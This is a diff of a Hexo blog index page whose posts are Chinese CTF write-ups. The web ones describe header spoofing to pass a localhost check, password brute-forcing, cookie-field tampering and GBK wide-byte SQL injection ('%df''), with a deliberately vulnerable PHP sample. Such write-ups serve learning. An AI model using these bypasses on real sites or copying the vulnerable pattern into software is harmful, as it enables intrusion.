@@ -1,792 +1,3700 @@
 <!DOCTYPE html>
-<html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="utf-8">
-  
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>MozhuCY&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
 
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/page/2/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="default">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link rel="stylesheet" href="/css/style.css">
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
 </head>
-</html>
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
-      </div>
-    </div>
-  </div>
+
+    
+        <body class="home-body">
+    
+    
+<header class="header index-header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <a class="home-link" href=/>MozhuCY's Studio.</a>
 </header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-二进制选手的Web路(WhaleCTF web部分writepu" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/二进制选手的Web路(WhaleCTF web部分writepu/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.879Z" itemprop="datePublished">2019-07-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/WEB/">WEB</a>
-  </div>
+    <div class="wrapper">
+        <div class="site-intro" style="
 
-  </div>
-  <div class="article-inner">
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
     
     
-      <header class="article-header">
+    <!-- 文章页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            MozhuCY's Studio.
+            <!-- 文章页  -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+                it's better to burn out than to fade away
+            
+            <!-- 文章页  -->
+            
+        </p>
+        <!-- 文章页meta -->
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/二进制选手的Web路(WhaleCTF web部分writepu/">二进制手的WEB路（WhaleCTF web部分writeup</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>WhaleCTF</strong> <strong>Web部分writeup</strong><br>二进制小白兼web盲来记录下今天做的几道题。。。<br>0x00</p>
-<blockquote>
-<p>签到题直接f12查看源码即可</p>
-</blockquote>
-<p>0x01 http呀</p>
-<blockquote>
-<p><strong>这里提供两种思路</strong><br>做web肯定少不了burpsuit啦，网页中给了提示，Do you know what happend just now?！ ( •̀∀•́ )突然想起南邮CTF平台上的两道题，考虑是不是flag在中间页面里，在点击时来了一次非常快的跳转呢？<br>抓了一次包发现啥都没有…后来尝试了几次发现，打开index.php的页面时，会跳到index.html。这就好办了，抓包拿flag，同时，同为二进制手的Cossack9989因为burpsuit过期了，想到了用wireshark来抓取流量，也是很顺利的拿到了flag<br>(偷偷宣传一波<a href="http://120.79.211.91/w8cloud" target="_blank" rel="noopener">W8Cloud战队</a>和<a href="http://blog.csdn.net/cossack9989" target="_blank" rel="noopener">Cossack9989</a>的博客</p>
-</blockquote>
-<p>0x02 本地登录</p>
-<blockquote>
-<p>本地登录，听名字大概就是伪造ip地址然后post过去吧，抓包加X-Forwarded-For: 127.0.0.1  成功拿到flag</p>
-</blockquote>
-<p>0x03密码泄露</p>
-<blockquote>
-<p>web的最后一题了，果然坑不少，是一个登陆样子的界面，查看源码发现有一个小提示“password.txt”，好的直接找到了密码表，来一发爆破吧，发现“Nsf0cuS”对应的返回包略大一点，查看Respone，有一个newpage，把对应的字符串base64解码居然到了一个新的网页w(ﾟДﾟ)w<br>来继续分析吧<br><img src="http://img.blog.csdn.net/20180204000148176?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTW96aHVDWQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>去网上查了一波关于留言板的wp，莫非是xss，那么高深的东西也做不了啊。。后来和学长交流了一下，发现居然做法还是抓包。。。我来随便留一段文字，改了一下userlevel=root，发现居然还不对，原来是忘记改了lsLogin,0改1，拿到flag<br><img src="http://img.blog.csdn.net/20180204000958409?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTW96aHVDWQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
-</blockquote>
-<p>sql注入对我这个web盲还是太高深了（；´д｀）ゞ学习一下再来补sql的wp吧….</p>
-
-      
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/二进制选手的Web路(WhaleCTF web部分writepu/" data-id="cjyn83qf7002licthj298qjro" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
 
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
 
-  
-    <article id="post-二进制手的Web路SQL2" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/二进制手的Web路SQL2/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.874Z" itemprop="datePublished">2019-07-29</time>
-</a>
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main index-page">
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/WEB/">WEB</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
     
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/二进制手的Web路SQL2/">二进制手的Web路 （sql注入篇</a>
-    </h1>
-  
-
-      </header>
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>sql注入0x02:<br><br>接着昨天的宽字符注入：<br><br>&ensp;&ensp;今天再又尝试了一下宽字节注入，题目为BUGKU的一道题，题目要求查询key表，id=1的string值。拿到题目，查看源代码，看到了gbk的字样，尝试一波宽字节注入hhhhh，id=1没发生任何事情，随后我把id改成了id=1’，还是没法生啥，好的，这次直接id=1%df’,报错了 (美滋滋 。确定为宽字节注入，暴库查询一气呵成，拿到flag。虽然了解了原理，但是发现自己对sql语句掌握的非常不熟练，结合着手注学一波sql语句吧。<br></p>
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/二进制选手的Web路(WhaleCTF web部分writepu/" >
+            
+                <span>二进制手的WEB路（WhaleCTF web部分writeup</span>
+        </a>
+        <div class="abstract-content">
+            WhaleCTF Web部分writeup二进制小白兼web盲来记录下今天做的几道题。。。0x00
 
-      
+签到题直接f12查看源码即可
+
+0x01 http呀
+
+这里提供两种思路做web肯定少不了burpsuit啦，网页中给了提示，Do you know what happend just now?！ ( •̀∀•́ )突然想起南邮CTF平台上的两道题，考虑是不是flag在中间页面里，在点击时来了一次非常快的跳转呢？抓了一次包发现啥都没有…后来尝试了几次发现，打开index.php的页面时，会跳到index.html。这就好办了，抓包拿flag，同时，同为二进制手的Cossack9989因为...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/二进制手的Web路SQL2/" >
+            
+                <span>二进制手的Web路 （sql注入篇</span>
+        </a>
+        <div class="abstract-content">
+            sql注入0x02:接着昨天的宽字符注入：&ensp;&ensp;今天再又尝试了一下宽字节注入，题目为BUGKU的一道题，题目要求查询key表，id=1的string值。拿到题目，查看源代码，看到了gbk的字样，尝试一波宽字节注入hhhhh，id=1没发生任何事情，随后我把id改成了id=1’，还是没法生啥，好的，这次直接id=1%df’,报错了 (美滋滋 。确定为宽字节注入，暴库查询一气呵成，拿到flag。虽然了解了原理，但是发现自己对sql语句掌握的非常不熟练，结合着手注学一波sql语句吧。
+
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/二进制手的Web路SQL1/" >
+            
+                <span>二进制手的Web路（sql注入篇</span>
+        </a>
+        <div class="abstract-content">
+            sql注入0x01：宽字节注入&ensp;&ensp;从宽字节注入开始记录吧，在网站的搭建时，为了安全起见，在PHP代码中常常会设置过滤，也正是因为PHP 的addslashes() 函数，防止了一部分sql注入，此函数会将用户输入的 “  ‘ ”，转义为“ \‘ ”,从而防止了单引号闭合所导致的sql注入漏洞的发生。&ensp;&ensp;但是，随其出现的问题，便是接下来要说的了。因为GBK编码的原因，假如用户输入的命令为” %df’ “那么很不幸的是，%df会和\结合起来形成一个汉字（其实只要汉字编码结尾为%5c（即为“\”）的都可以）。从而使得服务器端的assslashes()函数...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/二进制手的Web路SQL0/" >
+            
+                <span>二进制手的Web路（sql注入篇</span>
+        </a>
+        <div class="abstract-content">
+            想入门一下Web，非常的那种。那这几天系统的学一下SQL注入吧
+&ensp;&ensp;那么什么是SQL注入呢。SQL是数据库的一种，一般的SQL查询语句大概就是SELECT * FROM * WHERE * ,类似这种语句一般都会在PHP代码中构造好，预留出一个空，在取得客户端的用户输入的数值，将其填入，这时，如果不进行过滤的防护措施，不法用户所输入的恶意代码也可能被执行，进而达到控制数据库的效果，先举一个例子吧。
+123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123;    ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/z3/" >
+            
+                <span>z3求解器的一些简单使用</span>
+        </a>
+        <div class="abstract-content">
+            pip install z3-solver
+安装这东西,一行就够了,记住不要直接pip install z3就好
+from z3 import *
+然后创建一个通用求解器,s = Solver()
+一些函数:s.add()添加条件,s.model()列出求解结果,s.check()查看约束条件是否合格
+一般循环设立值是这样的:X=[Int(“x%d”%i) for i in range(5)]
+add的条件可以用逗号隔开,然后从s.model()中提取数据s.model()[x].as_long()
+之后有用到的例题在下面总结下
+
+
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/xnuca-final/" >
+            
+                <span>X-NUCA 2018个人赛/决赛PWN</span>
+        </a>
+        <div class="abstract-content">
+            终于熬过考试周了…重装电脑加上配虚拟机博客环境前后花了快两天.寒假整理一下以前的题目吧,先是12月初的XNUCA总决赛和铁三总决赛.
+个人赛PWN0(18solve)
+个人赛签到题,一个gets栈溢出,有canary,只有一次输入机会,显然不是ROP的打法,flag在内存中,先让我们输入小于flag长度的任意字符,输入回车结束
+这里利用stack smash,当canary存在时,如果发生栈溢出,程序会执行如下代码:
+
+12__libc_message (2, "*** %s ***: %s terminated\n",                    msg, __libc_ar...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/xnuca/" >
+            
+                <span>X-NUCA逆向部分题解</span>
+        </a>
+        <div class="abstract-content">
+            Code_Interpreter
+一个vm逆向,输入三个int型数据,进入一个vm进行运算,字节码在外面的code文件里,这里整理指令集,打log
+
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172code = [ord(i) for i in "090404090000080100080201080302060104050115070001040003016bcc7e...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/WHCTF2017 逆向签到题/" >
+            
+                <span>CTF二进制总结0x01</span>
+        </a>
+        <div class="abstract-content">
+            发现了一道大赛的签到题，来试一试下水大赛签到题次，ELF文件，扔进IDA，主函数逻辑很清晰，主要就是两个判断，一个是输入值的长度为14，二是将input传入一个judge函数，做判断。需要满足两个条件，由IDA反编译的结果来看，judge函数分析失败。这就很难受了，用gdb调试一波试试，顺便复习一下gdb操作。
+
+file BabyREset disassembly-flavor intelb *0x400660rdisassem /m
+
+得到如下结果
+12345678910111213141516171819202122232425262728293031323334353637383...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/wdctfpwn0/" >
+            
+                <span>网鼎杯半决赛pwn1</span>
+        </a>
+        <div class="abstract-content">
+            一个短信系统
+定义了两个结构体,分别如下,一个是用户信息的结构体,一个是信息结构体
+
+1234567891011121314151617180000000000000000 message         struc ; (sizeof=0x18, align=0x8, mappedto_6)00000000 title           dq ?                    ; offset00000008 content         dq ?00000010 next            dq ?00000018 message         ends000000...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/29/wcyvm/" >
+            
+                <span>WcyVM</span>
+        </a>
+        <div class="abstract-content">
+            加急出的一个垃圾vm
+给校赛出的题目,虽然很早写出来解释器部分,但是因为加密部分没有想好,所以一直没有什么进展,比赛结束前10个小时,因为逆向题目不太够,就草草写了个算法(单表替换),放了出来,结果半个小时就被秒了,很明显不是预期解,比赛结束后也听到了而且想到了各种解法,虽然归根结底是算法的问题,不过姑且把这个题当做一个例题来整理复习一下逆向的基本姿势和神奇操作
+首先明确一个方向,因为是单表替换,所以加密后的flag只有有限次数的组合,所以可以利用各种爆破姿势来进行解题
+
+//vm这个东西都要被出题人玩烂了,打log什么的基本做法就不写了
+黑盒测试
+首先要确定是个单表加密,那么这里可以采...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    <!-- paginator  -->
+    
+    <nav class="page-nav">
+        <a class="extend prev" rel="prev" href="/">&#60; PREV</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">NEXT &#62;</a>
+    </nav>
+    
+</main>
+            <!-- profile -->
+            
+            <div class="profile">
+    <img class="profile-avatar" alt="avatar" src= /avatar/Misaka.jpg >
+    <div class="profile-name">MozhuCY</div>
+    
+    <div class="profile-signature">
+        witness me
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/二进制手的Web路SQL2/" data-id="cjyn83qf6002jicthg0h12xcp" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-二进制手的Web路SQL1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/二进制手的Web路SQL1/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.870Z" itemprop="datePublished">2019-07-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/WEB/">WEB</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
     
     
-      <header class="article-header">
+    <div class="profile-social">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/二进制手的Web路SQL1/">二进制手的Web路（sql注入篇</a>
-    </h1>
-  
-
-      </header>
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>sql注入0x01：宽字节注入</strong><br>&ensp;&ensp;从宽字节注入开始记录吧，在网站的搭建时，为了安全起见，在PHP代码中常常会设置过滤，也正是因为PHP 的addslashes() 函数，防止了一部分sql注入，此函数会将用户输入的 “  ‘ ”，转义为“ \‘ ”,从而防止了单引号闭合所导致的sql注入漏洞的发生。<br><br><br>&ensp;&ensp;但是，随其出现的问题，便是接下来要说的了。因为GBK编码的原因，假如用户输入的命令为” %df’ “那么很不幸的是，%df会和\结合起来形成一个汉字（其实只要汉字编码结尾为%5c（即为“\”）的都可以）。从而使得服务器端的assslashes()函数失效，达到单引号闭合的目的。<br></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">""</span>);</span><br><span class="line">mysql_select_db(<span class="string">'sae'</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">		$id  = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">		$sql = <span class="string">"select id,title from news where id = '"</span>.$id.<span class="string">"'"</span> ;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"your sql:"</span>.$sql.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        $query = mysql_query($sql);</span><br><span class="line">        $array = mysql_fetch_array($query);</span><br><span class="line">        <span class="keyword">if</span>($query)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $array[<span class="string">'title'</span>] ;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"I need id"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+        
+            
+                <a href="mailto:930109649@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/mozhucy" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
 
